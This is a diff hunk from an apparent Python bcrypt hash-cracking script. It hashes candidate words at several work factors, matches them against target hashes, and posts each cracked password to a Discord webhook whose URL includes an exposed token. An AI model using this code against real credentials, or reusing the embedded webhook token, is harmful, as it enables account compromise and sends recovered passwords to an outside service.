@@ -33,7 +33,7 @@ for wf in work_factors:
         word_hashed = hashpw(word_encoded, salt_encoded)
         for h in trunc_encoded:
             if word_hashed == h:
-                message = {"content": "Success for `" + h.decode("utf-8") + "`!" + "\n" + word + " (command line)"}
+                message = {"content": "Success for `" + h.decode("utf-8") + "`!" + "\n" + word}
                 print("Success for `" + h.decode("utf-8") + "`!" + "\n" + word)
                 requests.post("https://discord.com/api/webhooks/1102392438380834839/zjb-ytg7HoIVsIKpRri3X3kZ2SUOrpbnCTmYn_lG0BvKRF9k4pax50qiiqzsdrlYgwfL", data=message)
                 trunc_encoded.remove(h)
